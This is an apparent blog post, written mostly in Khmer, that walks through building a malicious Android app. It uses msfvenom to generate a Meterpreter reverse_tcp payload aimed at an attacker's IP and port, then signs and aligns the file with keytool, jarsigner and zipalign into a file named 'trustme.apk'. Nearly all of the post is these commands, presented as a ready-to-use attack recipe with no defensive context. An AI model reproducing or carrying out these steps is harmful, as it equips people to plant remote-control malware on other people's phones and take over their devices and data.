---
title: "Android H4cking: Creating Malicious APK Payload"
date: 2025-05-21T11:00:00+07:00
description: របៀបបង្កើត payload លើប្រព័ន្ធ android
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- payload
- metasploit
categories:
- C2
- MSFvenom
series:
- Android
image: images/feature3/terminal.gif
---

#### តម្រូវការ
* ziplign
* jarsigner
* keytool

#### ប្រើប្រាស់ Metasploit ដើម្បីបង្កើត Android Payload

{{< highlight zsh "linenos=false" >}}
msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=192.168.13.X lport=4444 R -o pload.apk
{{< / highlight >}}

#### របៀប Sign ឯកសារ APK - បង្កើត Keystore

{{< highlight zsh "linenos=false" >}}
keytool -genkey -V -keystore key.keystore -alias Android -keyalg RSA -keysize 2048 -validity 10000

// បញ្ចូលលេខសំងាត់របស់ RSA និងព័ត៌មានឲ្យបានត្រឹមត្រូវ
{{< / highlight >}}

#### របៀប Sign ឯកសារ APK - Sign Payload

{{< highlight zsh "linenos=false" >}}
sudo apt-get install openjdk-21-jdk-headless
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore pload.apk Android

// បញ្ចូលលេខសំងាត់របស់ RSA ឲ្យបានត្រឹមត្រូវ
{{< / highlight >}}

#### របៀប Sign ឯកសារ APK - Verify Payload

{{< highlight zsh "linenos=false" >}}
jarsigner -verify -verbose -certs pload.apk
{{< / highlight >}}

#### របៀប Sign ឯកសារ APK - Verify payload into new file 

{{< highlight zsh "linenos=false" >}}
zipalign -v 4 pload.apk trustme.apk
{{< / highlight >}}

ឥឡូវនេះអ្នកទទួលបាន Android Payload ដែលពេញលេញមួយឈ្មោះថា trustme.apk ៕
